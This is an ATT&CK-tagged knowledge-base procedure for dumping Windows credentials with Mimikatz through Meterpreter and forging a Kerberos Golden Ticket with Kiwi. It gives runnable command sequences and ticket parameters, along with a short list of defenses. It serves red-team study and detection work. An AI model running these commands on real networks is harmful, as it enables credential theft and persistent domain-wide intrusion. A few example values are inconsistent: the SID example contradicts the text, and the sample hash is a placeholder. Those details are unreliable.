---
type: procedure
verified: true
submitted: false
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - '[[techniques/Credential Dumping|T1003 - Credential Dumping]]'
  - '[[techniques/Steal or Forge Kerberos Tickets|T1558.001 - Golden Ticket]]'
sub_techniques: []
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Meterpreter - Basic]]'
  - '[[tags/Mimikatz]]'
  - credential-dumping
  - golden-ticket
  - active-directory
commands:
  - '[[commands/meterpreter-load-mimikatz]]'
  - '[[commands/mimikatz-version]]'
  - '[[commands/mimikatz-sam-dump-hashes]]'
  - '[[commands/mimikatz-sekurlsa-wdigest]]'
  - '[[commands/mimikatz-sekurlsa-search-passwords]]'
  - '[[commands/mimikatz-sekurlsa-logon-passwords-full]]'
  - '[[commands/meterpreter-load-kiwi]]'
  - '[[commands/meterpreter-creds-all]]'
  - '[[commands/meterpreter-golden-ticket-create]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
  - '[[tools/Mimikatz]]'
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
---

# Credential-Dumping-and-Golden-Ticket-Creation-with-Metasploit-and-Mimikatz

## Summary

This procedure uses the Metasploit framework's Meterpreter session on a compromised Windows machine to load the Mimikatz extension, dump various credentials including local hashes, WDigest credentials, searched passwords, and logon passwords, and then load the Kiwi extension to retrieve all credentials and forge a Golden Ticket for domain-wide access. This enables lateral movement and privilege escalation by bypassing normal authentication mechanisms in Active Directory environments.

## Description

In this technique, an attacker with an established Meterpreter session (typically from initial access via exploitation) loads Mimikatz to extract sensitive credential data from memory and the SAM database. This includes NTLM hashes, plaintext passwords where available (e.g., via WDigest if enabled), and full logon details. Subsequently, the Kiwi extension (a Metasploit-integrated version of Mimikatz) is loaded to gather comprehensive credentials and generate a forged Kerberos ticket (Golden Ticket) using the domain's krbtgt account hash. The Golden Ticket impersonates any domain user, granting persistent access to all domain resources without further authentication. This is particularly effective in Windows domain environments with Kerberos authentication, allowing attackers to move laterally to domain controllers or other critical systems. Prerequisites include administrative privileges on the target and knowledge of domain details like SID and krbtgt hash (often obtained from prior dumps).

## Requirements

1. Established Meterpreter session on a compromised Windows machine with administrative privileges.
2. Metasploit framework installed and running on the attacker's machine (Kali Linux recommended).
3. Domain information: domain name, krbtgt NT hash, domain SID (without RID), target user account.
4. Network access to the target domain for ticket validation post-creation.

## Defense

- Disable WDigest authentication (via registry: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential = 0) to prevent plaintext password exposure.
- Enable Credential Guard on Windows 10+ to protect LSASS memory from dumping tools like Mimikatz.
- Monitor for suspicious process executions (e.g., powershell.exe spawning unusual children) and network anomalies indicating ticket forging.
- Implement Least Privilege and monitor for anomalous Kerberos ticket requests or logons from service accounts.
- Use tools like Sysmon for logging LSASS access and EDR solutions to detect Mimikatz signatures.

## Objectives

1. Extract credentials from memory and local stores for further use in the attack.
2. Forge a Golden Ticket to achieve domain admin-level persistence and lateral movement.
3. Validate the ticket by accessing domain resources without valid credentials.

## Instructions

### Step 1: Load Mimikatz Extension and Dump Credentials

**Context**: Begin by loading the Mimikatz extension in the Meterpreter session to access credential dumping modules. Then execute a sequence of commands to retrieve version info, SAM hashes, WDigest credentials, searched passwords, and full logon passwords. This step requires elevated privileges and targets LSASS and SAM for comprehensive credential harvest.

**Code** ([[codes/mimikatz-multi-command-credential-dump]]):

```powershell
load mimikatz
mimikatz_command -f version
mimikatz_command -f samdump::hashes
mimikatz_command -f sekurlsa::wdigest
mimikatz_command -f sekurlsa::searchPasswords
mimikatz_command -f sekurlsa::logonPasswords full
```

> This code sequence loads Mimikatz and runs dumping commands. Expected output includes Mimikatz version details, a list of local user hashes from SAM, any cached plaintext from WDigest, searched password strings in memory, and detailed logon sessions with usernames, NTLM hashes, and plaintext where available. If no plaintext is found, focus on cracking hashes offline.

Use individual commands for granular control:
- [[commands/meterpreter-load-mimikatz]] to load the extension.
- [[commands/mimikatz-version]] to verify loading.
- [[commands/mimikatz-sam-dump-hashes]] for local hashes.
- [[commands/mimikatz-sekurlsa-wdigest]] for WDigest creds.
- [[commands/mimikatz-sekurlsa-search-passwords]] to search memory.
- [[commands/mimikatz-sekurlsa-logon-passwords-full]] for logon details.

### Step 2: Load Kiwi Extension and Create Golden Ticket

**Context**: Switch to the Kiwi extension for advanced Kerberos manipulation. Retrieve all available credentials, then forge a Golden Ticket using the krbtgt hash (obtained from prior dumps or known values). This ticket allows impersonation of any domain user for persistent access.

**Code** ([[codes/kiwi-golden-ticket-generation]]):

```powershell
load kiwi
creds_all
golden_ticket_create -d <domainname> -k <nthashof krbtgt> -s <SID without le RID> -u <user_for_the_ticket> -t <location_to_store_tck>
```

> This code loads Kiwi, dumps all creds, and creates the ticket. Expected output: Credential summary from creds_all (including krbtgt hash if available), followed by confirmation of ticket creation and storage path. The ticket file (.kirbi or .ccache) can then be imported via [[commands/meterpreter-import-ticket]] or used externally with tools like Rubeus.

Use individual commands:
- [[commands/meterpreter-load-kiwi]] to load Kiwi.
- [[commands/meterpreter-creds-all]] to dump credentials.
- [[commands/meterpreter-golden-ticket-create]] to forge the ticket, substituting parameters like domain (e.g., contoso.com), krbtgt hash (e.g., aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0), SID (e.g., S-1-5-21-...-502 for krbtgt), user (e.g., administrator), and ticket location (e.g., C:\ticket.kirbi).

If the krbtgt hash is not available from creds_all, extract it manually from a DC dump using [[techniques/OS Credential Dumping|T1003.002 - Security Account Manager]]. Test the ticket by attempting access to a domain share or DC.
